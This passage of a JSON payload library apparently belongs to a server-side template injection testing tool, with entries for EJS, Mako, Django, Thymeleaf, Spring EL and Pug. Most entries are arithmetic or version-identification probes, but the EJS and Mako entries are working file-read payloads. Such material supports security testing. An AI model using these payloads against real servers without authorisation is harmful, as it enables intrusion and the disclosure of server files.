      "mode": "detection",
      "template": "<%= 7*7 %>",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-ejs-id-version",
      "name": "EJS node version",
      "category": "ssti",
      "engine": "ejs",
      "mode": "identification",
      "template": "<%= process.version %>",
      "tags": [
        "identification",
        "node"
      ],
      "notes": "Prints the Node.js version if the JS context is reachable."
    },
    {
      "id": "ssti-ejs-file-read",
      "name": "EJS readFileSync",
      "category": "ssti",
      "engine": "ejs",
      "mode": "file-read",
      "template": "<%= require('fs').readFileSync('<<POAD_FILE>>') %>",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "node"
      ],
      "notes": "Works only where require() is reachable from the template scope."
    },
    {
      "id": "ssti-mako-detect",
      "name": "Mako arithmetic probe",
      "category": "ssti",
      "engine": "mako",
      "mode": "detection",
      "template": "${7*7}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-mako-file-read",
      "name": "Mako open().read()",
      "category": "ssti",
      "engine": "mako",
      "mode": "file-read",
      "template": "${open('<<POAD_FILE>>').read()}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "python"
      ],
      "notes": "Mako evaluates arbitrary Python expressions inside ${...}."
    },
    {
      "id": "ssti-django-detect-add",
      "name": "Django add filter",
      "category": "ssti",
      "engine": "django",
      "mode": "detection",
      "template": "{{7|add:7}}",
      "expected": "14",
      "tags": [
        "detection"
      ],
      "notes": "Django does not evaluate {{7*7}}; the add filter proves template rendering."
    },
    {
      "id": "ssti-django-ctx-debug",
      "name": "Django debug tag",
      "category": "ssti",
      "engine": "django",
      "mode": "context",
      "template": "{% debug %}",
      "tags": [
        "context"
      ],
      "notes": "Dumps available context/variables when DEBUG is on. Django's template language is sandboxed: direct file read via template syntax is not supported."
    },
    {
      "id": "ssti-thymeleaf-detect",
      "name": "Thymeleaf inline arithmetic",
      "category": "ssti",
      "engine": "thymeleaf",
      "mode": "detection",
      "template": "[[${7*7}]]",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-thymeleaf-id-expr",
      "name": "Thymeleaf expression",
      "category": "ssti",
      "engine": "thymeleaf",
      "mode": "identification",
      "template": "[[${T(java.lang.System).getProperty('java.version')}]]",
      "version_dependent": true,
      "tags": [
        "identification",
        "spring"
      ],
      "notes": "Reads the JVM version via SpringEL if preprocessing expressions are evaluated."
    },
    {
      "id": "ssti-spring-el-detect",
      "name": "Spring EL arithmetic",
      "category": "ssti",
      "engine": "spring-el",
      "mode": "detection",
      "template": "${7*7}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-pug-detect",
      "name": "Pug interpolation arithmetic",
      "category": "ssti",
      "engine": "pug",
      "mode": "detection",
      "template": "#{7*7}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ],
      "notes": "Pug/Jade interpolation evaluates JS; RCE gadgets are environment-dependent and not shipped by default."
    }
  ]
}
